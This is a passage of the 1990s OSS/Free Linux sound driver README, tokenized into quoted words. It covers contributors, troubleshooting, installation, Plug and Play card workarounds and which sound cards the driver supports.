"==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "=", "THIS", "VERSION", "____REQUIRES____", "Linux", "2", ".", "1", ".", "57", "OR", "LATER", ".", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "=", "Packages", "\"", "snd", "-", "util", "-", "3", ".", "8", ".", "tar", ".", "gz", "\"", "and", "\"", "snd", "-", "data", "-", "0", ".", "1", ".", "tar", ".", "Z", "\"", "contain", "useful", "utilities", "to", "be", "used", "with", "this", "driver", ".", "See", "http", ":", "//", "www", ".", "opensound", ".", "com", "/", "ossfree", "/", "for", "download", "instructions", ".", "If", "you", "are", "looking", "for", "the", "installation", "instructions", ",", "please", "look", "forward", "into", "this", "document", ".", "Supported", "sound", "cards", "See", "below", ".", "Contributors", "This", "driver", "contains", "code", "by", "several", "contributors", ".", "In", "addition", "several", "other", "persons", "have", "given", "useful", "suggestions", ".", "The", "following", "is", "a", "list", "of", "major", "contributors", ".", "(", "I", "could", "have", "forgotten", "some", "names", ".", ")", "Craig", "Metz", "1", "/", "2", "of", "the", "PAS16", "Mixer", "and", "PCM", "support", "Rob", "Hooft", "Volume", "computation", "algorithm", "for", "the", "FM", "synth", ".", "Mika", "Liljeberg", "uLaw", "encoding", "and", "decoding", "routines", "Jeff", "Tranter", "Linux", "SOUND", "HOWTO", "document", "Greg", "Lee", "Volume", "computation", "algorithm", "for", "the", "GUS", "and", "lots", "of", "valuable", "suggestions", ".", "Andy", "Warner", "ISC", "port", "Jim", "Lowe", ",", "Amancio", "Hasty", "Jr", "FreeBSD", "/", "NetBSD", "port", "Anders", "Baekgaard", "Bug", "hunting", "and", "valuable", "suggestions", ".", "Joerg", "Schubert", "SB16", "DSP", "support", "(", "initial", "version", ")", ".", "Andrew", "Robinson", "Improvements", "to", "the", "GUS", "driver", "Megens", "SA", "MIDI", "recording", "for", "SB", "and", "SB", "Pro", "(", "initial", "version", ")", ".", "Mikael", "Nordqvist", "Linear", "volume", "support", "for", "GUS", "and", "nonblocking", "/", "dev", "/", "sequencer", ".", "Ian", "Hartas", "SVR4", ".", "2", "port", "Markus", "Aroharju", "and", "Risto", "Kankkunen", "Major", "contributions", "to", "the", "mixer", "support", "of", "GUS", "v3", ".", "7", ".", "Hunyue", "Yau", "Mixer", "support", "for", "SG", "NX", "Pro", ".", "Marc", "Hoffman", "PSS", "support", "(", "initial", "version", ")", ".", "Rainer", "Vranken", "Initialization", "for", "Jazz16", "(", "initial", "version", ")", ".", "Peter", "Trattler", "Initial", "version", "of", "loadable", "module", "support", "for", "Linux", ".", "JRA", "Gibson", "16", "bit", "mode", "for", "Jazz16", "(", "initial", "version", ")", "Davor", "Jadrijevic", "MAD16", "support", "(", "initial", "version", ")", "Gregor", "Hoffleit", "Mozart", "support", "(", "initial", "version", ")", "Riccardo", "Facchetti", "Audio", "Excel", "DSP", "16", "(", "aedsp16", ")", "support", "James", "Hightower", "Spotting", "a", "tiny", "but", "important", "bug", "in", "CS423x", "support", ".", "Denis", "Sablic", "OPTi", "82C924", "specific", "enhancements", "(", "non", "PnP", "mode", ")", "Tim", "MacKenzie", "Full", "duplex", "support", "for", "OPTi", "82C930", ".", "Please", "look", "at", "lowlevel", "/", "README", "for", "more", "contributors", ".", "There", "are", "probably", "many", "other", "names", "missing", ".", "If", "you", "have", "sent", "me", "some", "patches", "and", "your", "name", "is", "not", "in", "the", "above", "list", ",", "please", "inform", "me", ".", "Sending", "your", "contributions", "or", "patches", "First", "of", "all", "it", "'", "s", "highly", "recommended", "to", "contact", "me", "before", "sending", "anything", "or", "before", "even", "starting", "to", "do", "any", "work", ".", "Tell", "me", "what", "you", "suggest", "to", "be", "changed", "or", "what", "you", "have", "planned", "to", "do", ".", "Also", "ensure", "you", "are", "using", "the", "very", "latest", "(", "development", ")", "version", "of", "OSS", "/", "Free", "since", "the", "change", "may", "already", "be", "implemented", "there", ".", "In", "general", "it", "'", "s", "a", "major", "waste", "of", "time", "to", "try", "to", "improve", "a", "several", "months", "old", "version", ".", "Information", "about", "the", "latest", "version", "can", "be", "found", "from", "http", ":", "//", "www", ".", "opensound", ".", "com", "/", "ossfree", ".", "In", "general", "there", "is", "no", "point", "in", "sending", "me", "patches", "relative", "to", "production", "kernels", ".", "Sponsors", "etc", ".", "The", "following", "companies", "have", "greatly", "helped", "development", "of", "this", "driver", "in", "form", "of", "a", "free", "copy", "of", "their", "product", ":", "Novell", ",", "Inc", ".", "UnixWare", "personal", "edition", "+", "SDK", "The", "Santa", "Cruz", "Operation", ",", "Inc", ".", "A", "SCO", "OpenServer", "+", "SDK", "Ensoniq", "Corp", ",", "a", "SoundScape", "card", "and", "extensive", "amount", "of", "assistance", "MediaTrix", "Peripherals", "Inc", ",", "a", "AudioTrix", "Pro", "card", "+", "SDK", "Acer", ",", "Inc", ".", "a", "pair", "of", "AcerMagic", "S23", "cards", ".", "In", "addition", "the", "following", "companies", "have", "provided", "me", "sufficient", "amount", "of", "technical", "information", "at", "least", "some", "of", "their", "products", "(", "free", "or", "$", "$$", "):", "Advanced", "Gravis", "Computer", "Technology", "Ltd", ".", "Media", "Vision", "Inc", ".", "Analog", "Devices", "Inc", ".", "Logitech", "Inc", ".", "Aztech", "Labs", "Inc", ".", "Crystal", "Semiconductor", "Corporation", ",", "Integrated", "Circuit", "Systems", "Inc", ".", "OAK", "Technology", "OPTi", "Turtle", "Beach", "miro", "Ad", "Lib", "Inc", ".", "(", "$$", ")", "Music", "Quest", "Inc", ".", "(", "$$", ")", "Creative", "Labs", "(", "$$", "$)", "If", "you", "have", "some", "problems", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "Read", "the", "sound", "HOWTO", "(", "sunsite", ".", "unc", ".", "edu", ":", "/", "pub", "/", "Linux", "/", "docs", "/", "..", ".?", ").", "Also", "look", "at", "the", "home", "page", "(", "http", ":", "//", "www", ".", "opensound", ".", "com", "/", "ossfree", ")", ".", "It", "may", "contain", "info", "about", "some", "recent", "bug", "fixes", ".", "It", "'", "s", "likely", "that", "you", "have", "some", "problems", "when", "trying", "to", "use", "the", "sound", "driver", "first", "time", ".", "Sound", "cards", "don", "'", "t", "have", "standard", "configuration", "so", "there", "are", "no", "good", "default", "configuration", "to", "use", ".", "Please", "try", "to", "use", "same", "I", "/", "O", ",", "DMA", "and", "IRQ", "values", "for", "the", "sound", "card", "than", "with", "DOS", ".", "If", "you", "get", "an", "error", "message", "when", "trying", "to", "use", "the", "driver", ",", "please", "look", "at", "/", "var", "/", "adm", "/", "messages", "for", "more", "verbose", "error", "message", ".", "The", "following", "errors", "are", "likely", "with", "/", "dev", "/", "dsp", "and", "/", "dev", "/", "audio", ".", "-", "\"", "No", "such", "device", "or", "address", "\"", ".", "This", "error", "indicates", "that", "there", "are", "no", "suitable", "hardware", "for", "the", "device", "file", "or", "the", "sound", "driver", "has", "been", "compiled", "without", "support", "for", "this", "particular", "device", ".", "For", "example", "/", "dev", "/", "audio", "and", "/", "dev", "/", "dsp", "will", "not", "work", "if", "\"", "digitized", "voice", "support", "\"", "was", "not", "enabled", "during", "\"", "make", "config", "\"", ".", "-", "\"", "Device", "or", "resource", "busy", "\"", ".", "Probably", "the", "IRQ", "(", "or", "DMA", ")", "channel", "required", "by", "the", "sound", "card", "is", "in", "use", "by", "some", "other", "device", "/", "driver", ".", "-", "\"", "I", "/", "O", "error", "\"", ".", "Almost", "certainly", "(", "99", "%", ")", "it", "'", "s", "an", "IRQ", "or", "DMA", "conflict", ".", "Look", "at", "the", "kernel", "messages", "in", "/", "var", "/", "adm", "/", "notice", "for", "more", "info", ".", "-", "\"", "Invalid", "argument", "\"", ".", "The", "application", "is", "calling", "ioctl", "(", ")", "with", "impossible", "parameters", ".", "Check", "that", "the", "application", "is", "for", "sound", "driver", "version", "2", ".", "X", "or", "later", ".", "Linux", "installation", "=", "==", "==", "==", "==", "==", "==", "==", "==", "=", "IMPORTANT", "!", "Read", "this", "if", "you", "are", "installing", "a", "separately", "distributed", "version", "of", "this", "driver", ".", "Check", "that", "your", "kernel", "version", "works", "with", "this", "release", "of", "the", "driver", "(", "see", "Readme", ")", ".", "Also", "verify", "that", "your", "current", "kernel", "version", "doesn", "'", "t", "have", "more", "recent", "sound", "driver", "version", "than", "this", "one", ".", "IT", "'", "S", "HIGHLY", "RECOMMENDED", "THAT", "YOU", "USE", "THE", "SOUND", "DRIVER", "VERSION", "THAT", "IS", "DISTRIBUTED", "WITH", "KERNEL", "SOURCES", ".", "When", "installing", "separately", "distributed", "sound", "driver", "you", "should", "first", "read", "the", "above", "notice", ".", "Then", "try", "to", "find", "proper", "directory", "where", "and", "how", "to", "install", "the", "driver", "sources", ".", "You", "should", "not", "try", "to", "install", "a", "separately", "distributed", "driver", "version", "if", "you", "are", "not", "able", "to", "find", "the", "proper", "way", "yourself", "(", "in", "this", "case", "use", "the", "version", "that", "is", "distributed", "with", "kernel", "sources", ")", ".", "Remove", "old", "version", "of", "linux", "/", "drivers", "/", "sound", "directory", "before", "installing", "new", "files", ".", "To", "build", "the", "device", "files", "you", "need", "to", "run", "the", "enclosed", "shell", "script", "(", "see", "below", ")", ".", "You", "need", "to", "do", "this", "only", "when", "installing", "sound", "driver", "first", "time", "or", "when", "upgrading", "to", "much", "recent", "version", "than", "the", "earlier", "one", ".", "Configure", "and", "compile", "Linux", "as", "normally", "(", "remember", "to", "include", "the", "sound", "support", "during", "\"", "make", "config", "\"", ").", "Please", "refer", "to", "kernel", "documentation", "for", "instructions", "about", "configuring", "and", "compiling", "kernel", ".", "File", "Readme", ".", "cards", "contains", "card", "specific", "instructions", "for", "configuring", "this", "driver", "for", "use", "with", "various", "sound", "cards", ".", "Boot", "time", "configuration", "(", "using", "lilo", "and", "insmod", ")", "This", "information", "has", "been", "removed", ".", "Too", "many", "users", "didn", "'", "t", "believe", "that", "it", "'", "s", "really", "not", "necessary", "to", "use", "this", "method", ".", "Please", "look", "at", "Readme", "of", "sound", "driver", "version", "3", ".", "0", ".", "1", "if", "you", "still", "want", "to", "use", "this", "method", ".", "Problems", "Common", "error", "messages", ":", "/", "dev", "/", "??", "??", "??", "?:", "No", "such", "file", "or", "directory", ".", "Run", "the", "script", "at", "the", "end", "of", "this", "file", ".", "/", "dev", "/", "??", "??", "??", "?:", "No", "such", "device", ".", "You", "are", "not", "running", "kernel", "which", "contains", "the", "sound", "driver", ".", "When", "using", "modularized", "sound", "driver", "this", "error", "means", "that", "the", "sound", "driver", "is", "not", "loaded", ".", "/", "dev", "/", "??", "??", ":", "No", "such", "device", "or", "address", ".", "Sound", "driver", "didn", "'", "t", "detect", "suitable", "card", "when", "initializing", ".", "Please", "look", "at", "Readme", ".", "cards", "for", "info", "about", "configuring", "the", "driver", "with", "your", "card", ".", "Also", "check", "for", "possible", "boot", "(", "insmod", ")", "time", "error", "messages", "in", "/", "var", "/", "adm", "/", "messages", ".", "Other", "messages", "or", "problems", "Please", "check", "http", ":", "//", "www", ".", "opensound", ".", "com", "/", "ossfree", "for", "more", "info", ".", "Configuring", "version", "3", ".", "8", "(", "for", "Linux", ")", "with", "some", "common", "sound", "cards", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "=", "This", "document", "describes", "configuring", "sound", "cards", "with", "the", "freeware", "version", "of", "Open", "Sound", "Systems", "(", "OSS", "/", "Free", ")", ".", "Information", "about", "the", "commercial", "version", "(", "OSS", "/", "Linux", ")", "and", "its", "configuration", "is", "available", "from", "http", ":", "//", "www", ".", "opensound", ".", "com", "/", "linux", ".", "html", ".", "Information", "presented", "here", "is", "not", "valid", "for", "OSS", "/", "Linux", ".", "If", "you", "are", "unsure", "about", "how", "to", "configure", "OSS", "/", "Free", "you", "can", "download", "the", "free", "evaluation", "version", "of", "OSS", "/", "Linux", "from", "the", "above", "address", ".", "There", "is", "a", "chance", "that", "it", "can", "autodetect", "your", "sound", "card", ".", "In", "this", "case", "you", "can", "use", "the", "information", "included", "in", "soundon", ".", "log", "when", "configuring", "OSS", "/", "Free", ".", "IMPORTANT", "!", "This", "document", "covers", "only", "cards", "that", "were", "\"", "known", "\"", "when", "this", "driver", "version", "was", "released", ".", "Please", "look", "at", "http", ":", "//", "www", ".", "opensound", ".", "com", "/", "ossfree", "for", "info", "about", "cards", "introduced", "recently", ".", "When", "configuring", "the", "sound", "driver", ",", "you", "should", "carefully", "check", "each", "sound", "configuration", "option", "(", "particularly", "\"", "Support", "for", "/", "dev", "/", "dsp", "and", "/", "dev", "/", "audio", "\"", ").", "The", "default", "values", "offered", "by", "these", "programs", "are", "not", "necessarily", "valid", ".", "THE", "BIGGEST", "MISTAKES", "YOU", "CAN", "MAKE", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "1", ".", "Assuming", "that", "the", "card", "is", "Sound", "Blaster", "compatible", "when", "it", "'", "s", "not", ".", "The", "number", "one", "mistake", "is", "to", "assume", "that", "your", "card", "is", "compatible", "with", "Sound", "Blaster", ".", "Only", "the", "cards", "made", "by", "Creative", "Technology", "or", "which", "have", "one", "or", "more", "chips", "labeled", "by", "Creative", "are", "SB", "compatible", ".", "In", "addition", "there", "are", "few", "sound", "chipsets", "which", "are", "SB", "compatible", "in", "Linux", "such", "as", "ESS1688", "or", "Jazz16", ".", "Note", "that", "SB", "compatibility", "in", "DOS", "/", "Windows", "does", "_NOT_", "mean", "anything", "in", "Linux", ".", "IF", "YOU", "REALLY", "ARE", "150", "%", "SURE", "YOU", "HAVE", "A", "SOUND", "BLASTER", "YOU", "CAN", "SKIP", "THE", "REST", "OF", "THIS", "CHAPTER", ".", "For", "most", "other", "\"", "supposed", "to", "be", "SB", "compatible", "\"", "cards", "you", "have", "to", "use", "other", "than", "SB", "drivers", "(", "see", "below", ")", ".", "It", "is", "possible", "to", "get", "most", "sound", "cards", "to", "work", "in", "SB", "mode", "but", "in", "general", "it", "'", "s", "a", "complete", "waste", "of", "time", ".", "There", "are", "several", "problems", "which", "you", "will", "encounter", "by", "using", "SB", "mode", "with", "cards", "that", "are", "not", "truly", "SB", "compatible", ":", "The", "SB", "emulation", "is", "at", "most", "SB", "Pro", "(", "DSP", "version", "3", ".", "x", ")", "which", "means", "that", "you", "get", "only", "8", "bit", "audio", "(", "there", "is", "always", "an", "another", "(", "\"", "native", "\"", ")", "mode", "which", "gives", "the", "16", "bit", "capability", ")", ".", "The", "8", "bit", "only", "operation", "is", "the", "reason", "why", "many", "users", "claim", "that", "sound", "quality", "in", "Linux", "is", "much", "worse", "than", "in", "DOS", ".", "In", "addition", "some", "applications", "require", "16", "bit", "mode", "and", "they", "produce", "just", "noise", "with", "a", "8", "bit", "only", "device", ".", "The", "card", "may", "work", "only", "in", "some", "cases", "but", "refuse", "to", "work", "most", "of", "the", "time", ".", "The", "SB", "compatible", "mode", "always", "requires", "special", "initialization", "which", "is", "done", "by", "the", "DOS", "/", "Windows", "drivers", ".", "This", "kind", "of", "cards", "work", "in", "Linux", "after", "you", "have", "warm", "booted", "it", "after", "DOS", "but", "they", "don", "'", "t", "work", "after", "cold", "boot", "(", "power", "on", "or", "reset", ")", ".", "You", "get", "the", "famous", "\"", "DMA", "timed", "out", "\"", "messages", ".", "Usually", "all", "SB", "clones", "have", "software", "selectable", "IRQ", "and", "DMA", "settings", ".", "If", "the", "(", "power", "on", "default", ")", "values", "currently", "used", "by", "the", "card", "don", "'", "t", "match", "configuration", "of", "the", "driver", "you", "will", "get", "the", "above", "error", "message", "whenever", "you", "try", "to", "record", "or", "play", ".", "There", "are", "few", "other", "reasons", "to", "the", "DMA", "timeout", "message", "but", "using", "the", "SB", "mode", "seems", "to", "be", "the", "most", "common", "cause", ".", "2", ".", "Trying", "to", "use", "a", "PnP", "(", "Plug", "&", "Play", ")", "card", "just", "like", "an", "ordinary", "sound", "card", "Plug", "&", "Play", "is", "a", "protocol", "defined", "by", "Intel", "and", "Microsoft", ".", "It", "lets", "operating", "systems", "to", "easily", "identify", "and", "reconfigure", "I", "/", "O", "ports", ",", "IRQs", "and", "DMAs", "of", "ISA", "cards", ".", "The", "problem", "with", "PnP", "cards", "is", "that", "the", "standard", "Linux", "doesn", "'", "t", "currently", "(", "versions", "2", ".", "1", ".", "x", "and", "earlier", ")", "don", "'", "t", "support", "PnP", ".", "This", "means", "that", "you", "will", "have", "to", "use", "some", "special", "tricks", "(", "see", "later", ")", "to", "get", "a", "PnP", "card", "alive", ".", "Many", "PnP", "cards", "work", "after", "they", "have", "been", "initialized", "but", "this", "is", "not", "always", "the", "case", ".", "There", "are", "sometimes", "both", "PnP", "and", "non", "-", "PnP", "versions", "of", "the", "same", "sound", "card", ".", "The", "non", "-", "PnP", "version", "is", "the", "original", "model", "which", "usually", "has", "been", "discontinued", "more", "than", "an", "year", "ago", ".", "The", "PnP", "version", "has", "the", "same", "name", "but", "with", "\"", "PnP", "\"", "appended", "to", "it", "(", "sometimes", "not", ")", ".", "This", "causes", "major", "confusion", "since", "the", "non", "-", "PnP", "model", "works", "with", "Linux", "but", "the", "PnP", "one", "doesn", "'", "t", ".", "You", "should", "carefully", "check", "if", "\"", "Plug", "&", "Play", "\"", "or", "\"", "PnP", "\"", "is", "mentioned", "in", "the", "name", "of", "the", "card", "or", "in", "the", "documentation", "or", "package", "that", "came", "with", "the", "card", ".", "Everything", "described", "in", "the", "rest", "of", "this", "document", "is", "not", "necessarily", "valid", "for", "PnP", "models", "of", "sound", "cards", "even", "you", "have", "managed", "to", "wake", "up", "the", "card", "properly", ".", "Many", "PnP", "cards", "are", "simply", "too", "different", "from", "their", "non", "-", "PnP", "ancestors", "which", "are", "covered", "by", "this", "document", ".", "Cards", "that", "are", "not", "(", "fully", ")", "supported", "by", "this", "driver", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "See", "http", ":", "//", "www", ".", "opensound", ".", "com", "/", "ossfree", "for", "information", "about", "sound", "cards", "to", "be", "supported", "in", "future", ".", "How", "to", "use", "sound", "without", "recompiling", "kernel", "and", "/", "or", "sound", "driver", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "There", "is", "a", "commercial", "sound", "driver", "which", "comes", "in", "precompiled", "form", "and", "doesn", "'", "t", "require", "recompiling", "of", "the", "kernel", ".", "See", "http", ":", "//", "www", ".", "4Front", "-", "tech", ".", "com", "/", "oss", ".", "html", "for", "more", "info", ".", "Configuring", "PnP", "cards", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "New", "versions", "of", "most", "sound", "cards", "use", "the", "so", "-", "called", "ISA", "PnP", "protocol", "for", "soft", "configuring", "their", "I", "/", "O", ",", "IRQ", ",", "DMA", "and", "shared", "memory", "resources", ".", "Currently", "at", "least", "cards", "made", "by", "Creative", "Technology", "(", "SB32", "and", "SB32AWE", "PnP", ")", ",", "Gravis", "(", "GUS", "PnP", "and", "GUS", "PnP", "Pro", ")", ",", "Ensoniq", "(", "Soundscape", "PnP", ")", "and", "Aztech", "(", "some", "Sound", "Galaxy", "models", ")", "use", "PnP", "technology", ".", "The", "CS4232", "/", "4236", "audio", "chip", "by", "Crystal", "Semiconductor", "(", "Intel", "Atlantis", ",", "HP", "Pavilion", "and", "many", "other", "motherboards", ")", "is", "also", "based", "on", "PnP", "technology", "but", "there", "is", "a", "\"", "native", "\"", "driver", "available", "for", "it", "(", "see", "information", "about", "CS4232", "later", "in", "this", "document", ")", ".", "PnP", "sound", "cards", "(", "as", "well", "as", "most", "other", "PnP", "ISA", "cards", ")", "are", "not", "supported", "by", "this", "version", "of", "the", "driver", ".", "Proper", "support", "for", "them", "should", "be", "released", "during", "97", "once", "the", "kernel", "level", "PnP", "support", "is", "available", ".", "There", "is", "a", "method", "to", "get", "most", "of", "the", "PnP", "cards", "to", "work", ".", "The", "basic", "method", "is", "the", "following", ":", "1", ")", "Boot", "DOS", "so", "the", "card", "'", "s", "DOS", "drivers", "have", "a", "chance", "to", "initialize", "it", ".", "2", ")", "_Cold_", "boot", "to", "Linux", "by", "using", "\"", "loadlin", ".", "exe", "\"", ".", "Hitting", "ctrl", "-", "alt", "-", "del", "works", "with", "older", "machines", "but", "causes", "a", "hard", "reset", "of", "all", "cards", "on", "recent", "(", "Pentium", ")", "machines", ".", "3", ")", "If", "you", "have", "the", "sound", "driver", "in", "Linux", "configured", "properly", ",", "the", "card", "should", "work", "now", ".", "\"", "Proper", "\"", "means", "that", "I", "/", "O", ",", "IRQ", "and", "DMA", "settings", "are", "the", "same", "as", "in", "DOS", ".", "The", "hard", "part", "is", "to", "find", "which", "settings", "were", "used", ".", "See", "the", "documentation", "of", "your", "card", "for", "more", "info", ".", "Windows", "95", "could", "work", "as", "well", "as", "DOS", "but", "running", "loadlin", "may", "be", "difficult", ".", "Probably", "you", "should", "\"", "shut", "down", "\"", "your", "machine", "to", "MS", "-", "DOS", "mode", "before", "running", "it", ".", "Some", "machines", "have", "a", "BIOS", "utility", "for", "setting", "PnP", "resources", ".", "This", "is", "a", "good", "way", "to", "configure", "some", "cards", ".", "In", "this", "case", "you", "don", "'", "t", "need", "to", "boot", "DOS", "/", "Win95", "before", "starting", "Linux", ".", "Another", "way", "to", "initialize", "PnP", "cards", "without", "DOS", "/", "Win95", "is", "a", "Linux", "based", "PnP", "isolation", "tool", ".", "When", "writing", "this", "there", "is", "a", "pre", "alpha", "test", "version", "of", "such", "a", "tool", "available", "from", "ftp", ":", "//", "ftp", ".", "demon", ".", "co", ".", "uk", "/", "pub", "/", "unix", "/", "linux", "/", "utils", ".", "The", "file", "is", "called", "isapnptools", "-", "*.", "Please", "note", "that", "this", "tool", "is", "just", "a", "temporary", "solution", "which", "may", "be", "incompatible", "with", "future", "kernel", "versions", "having", "proper", "support", "for", "PnP", "cards", ".", "There", "are", "bugs", "in", "setting", "DMA", "channels", "in", "earlier", "versions", "of", "isapnptools", "so", "at", "least", "version", "1", ".", "6", "is", "required", "with", "sound", "cards", ".", "Yet", "another", "way", "to", "use", "PnP", "cards", "is", "to", "use", "(", "commercial", ")", "OSS", "/", "Linux", "drivers", ".", "See", "http", ":", "//", "www", ".", "opensound", ".", "com", "/", "linux", ".", "html", "for", "more", "info", ".", "This", "is", "probably", "the", "way", "you", "should", "do", "it", "if", "you", "don", "'", "t", "want", "to", "spend", "time", "recompiling", "the", "kernel", "and", "required", "tools", ".", "Read", "this", "before", "trying", "to", "configure", "the", "driver", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "There", "are", "currently", "many", "cards", "that", "work", "with", "this", "driver", ".", "Some", "of", "the", "cards", "have", "native", "support", "while", "others", "work", "since", "they", "emulate", "some", "other", "card", "(", "usually", "SB", ",", "MSS", "/", "WSS", "and", "/", "or", "MPU401", ")", ".", "The", "following", "cards", "have", "native", "support", "in", "the", "driver", ".", "Detailed", "instructions", "for", "configuring", "these", "cards", "will", "be", "given", "later", "in", "this", "document", ".", "Pro", "Audio", "Spectrum", "16", "(", "PAS16", ")", "and", "compatibles", ":", "Pro", "Audio", "Spectrum", "16", "Pro", "Audio", "Studio", "16", "Logitech", "Sound", "Man", "16", "NOTE", "!", "The", "original", "Pro", "Audio", "Spectrum", "as", "well", "as", "the", "PAS", "+", "are", "not", "and", "will", "not", "be", "supported", "by", "the", "driver", ".", "Media", "Vision", "Jazz16", "based", "cards", "Pro", "Sonic", "16", "Logitech", "SoundMan", "Wave", "(", "Other", "Jazz", "based", "cards", "should", "work", "but", "I", "don", "'", "t", "have", "any", "reports", "about", "them", ")", ".", "Sound", "Blasters", "SB", "1", ".", "0", "to", "2", ".", "0", "SB", "Pro", "SB", "16", "SB32", "/", "64", "/", "AWE", "Configure", "SB32", "/", "64", "/", "AWE", "just", "like", "SB16", ".", "See", "lowlevel", "/", "README", ".", "awe", "for", "information", "about", "using", "the", "wave", "table", "synth", ".", "NOTE", "!", "AWE63", "/", "Gold", "and", "16", "/", "32", "/", "AWE", "\"", "PnP", "\"", "cards", "need", "to", "be", "activated", "using", "isapnptools", "before", "they", "work", "with", "OSS", "/", "Free", ".", "SB16", "compatible", "cards", "by", "other", "manufacturers", "than", "Creative", ".", "You", "have", "been", "fooled", "since", "there", "are", "_no_", "SB16", "compatible", "cards", "on", "the", "market", "(", "as", "of", "May", "1997", ")", ".", "It", "'", "s", "likely", "that", "your", "card", "is", "compatible", "just", "with", "SB", "Pro", "but", "there", "is", "also", "a", "non", "-", "SB", "compatible", "16", "bit", "mode", ".", "Usually", "it", "'", "s", "MSS", "/", "WSS", "but", "it", "could", "also", "be", "a", "proprietary", "one", "like", "MV", "Jazz16", "or", "ESS", "ES688", ".", "OPTi", "MAD16", "chips", "are", "very", "common", "in", "so", "called", "\"", "SB", "16", "bit", "cards", "\"", "(", "try", "with", "the", "MAD16", "driver", ")", ".", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "=", "\"", "Supposed", "to", "be", "SB", "compatible", "\"", "cards", ".", "Forget", "the", "SB", "compatibility", "and", "check", "for", "other", "alternatives", "first", ".", "The", "only", "cards", "that", "work", "with", "the", "SB", "driver", "in", "Linux", "have", "been", "made", "by", "Creative", "Technology", "(", "there", "is", "at", "least", "one", "chip", "on", "the", "card", "with", "\"", "CREATIVE", "\"", "printed", "on", "it", ")", ".", "The", "only", "other", "SB", "compatible", "chips", "are", "ESS", "and", "Jazz16", "chips", "(", "maybe", "ALSxxx", "chips", "too", "but", "they", "probably", "don", "'", "t", "work", ")", ".", "Most", "other", "\"", "16", "bit", "SB", "compatible", "\"", "cards", "such", "as", "\"", "OPTi", "/", "MAD16", "\"", "or", "\"", "Crystal", "\"", "are", "_NOT_", "SB", "compatible", "in", "Linux", ".", "Practically", "all", "sound", "cards", "have", "some", "kind", "of", "SB", "emulation", "mode", "in", "addition", "to", "their", "native", "(", "16", "bit", ")", "mode", ".", "In", "most", "cases", "this", "(", "8", "bit", "only", ")", "SB", "compatible", "mode", "doesn", "'", "t", "work", "with", "Linux", ".", "If", "you", "get", "it", "working", "it", "may", "cause", "problems", "with", "games", "and", "applications", "which", "require", "16", "bit", "audio", ".", "Some", "16", "bit", "only", "applications", "don", "'", "t", "check", "if", "the", "card", "actually", "supports", "16", "bits", ".", "They", "just", "dump", "16", "bit", "data", "to", "a", "8", "bit", "card", "which", "produces", "just", "noise", ".", "In", "most", "cases", "the", "16", "bit", "native", "mode", "is", "supported", "by", "Linux", ".", "Use", "the", "SB", "mode", "with", "\"", "clones", "\"", "only", "if", "you", "don", "'", "t", "find", "anything", "better", "from", "the", "rest", "of", "this", "doc", ".", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "=", "Gravis", "Ultrasound", "(", "GUS", ")", "GUS", "GUS", "+", "the", "16", "bit", "option", "GUS", "MAX", "GUS", "ACE", "(", "No", "MIDI", "port", "and", "audio", "recording", ")", "GUS", "PnP", "(", "with", "RAM", ")", "MPU", "-", "401", "and", "compatibles", "The", "driver", "works", "both", "with", "the", "full", "(", "intelligent", "mode", ")", "MPU", "-", "401", "cards", "(", "such", "as", "MPU", "IPC", "-", "T", "and", "MQX", "-", "32M", ")", "and", "with", "the", "UART", "only", "dumb", "MIDI", "ports", ".", "MPU", "-", "401", "is", "currently", "the", "most", "common", "MIDI", "interface", ".", "Most", "sound", "cards", "are", "compatible", "with", "it", ".", "However", ",", "don", "'", "t", "enable", "MPU401", "mode", "blindly", ".", "Many", "cards", "with", "native", "support", "in", "the", "driver", "have", "their", "own", "MPU401", "driver", ".", "Enabling", "the", "standard", "one", "will", "cause", "a", "conflict", "with", "these", "cards", ".", "So", "check", "if", "your", "card", "is", "in", "the", "list", "of", "supported", "cards", "before", "enabling", "MPU401", ".", "Windows", "Sound", "System", "(", "MSS", "/", "WSS", ")", "Even", "when", "Microsoft", "has", "discontinued", "their", "own", "Sound", "System", "card", "they", "managed", "to", "make", "it", "a", "standard", ".", "MSS", "compatible", "cards", "are", "based", "on", "a", "codec", "chip", "which", "is", "easily", "available", "from", "at", "least", "two", "manufacturers", "(", "AD1848", "by", "Analog", "Devices", "and", "CS4231", "/", "CS4248", "by", "Crystal", "Semiconductor", ")", ".", "Currently", "most", "sound", "cards", "are", "based", "on", "one", "of", "the", "MSS", "compatible", "codec", "chips", ".", "The", "CS4231", "is", "used", "in", "the", "high", "quality", "cards", "such", "as", "GUS", "MAX", ",", "MediaTrix", "AudioTrix", "Pro", "and", "TB", "Tropez", "(", "GUS", "MAX", "is", "not", "MSS", "compatible", ")", ".", "Having", "a", "AD1848", ",", "CS4248", "or", "CS4231", "codec", "chip", "on", "the", "card", "is", "a", "good", "sign", ".", "Even", "if", "the", "card", "is", "not", "MSS", "compatible", ",", "it", "could", "be", "easy", "to", "write", "support", "for", "it", ".", "Note", "also", "that", "most", "MSS", "compatible", "cards", "require", "special", "boot", "time", "initialization", "which", "may", "not", "be", "present", "in", "the", "driver", ".", "Also", ",", "some", "MSS", "compatible", "cards", "have", "native", "support", ".", "Enabling", "the", "MSS", "support", "with", "these", "cards", "is", "likely", "to", 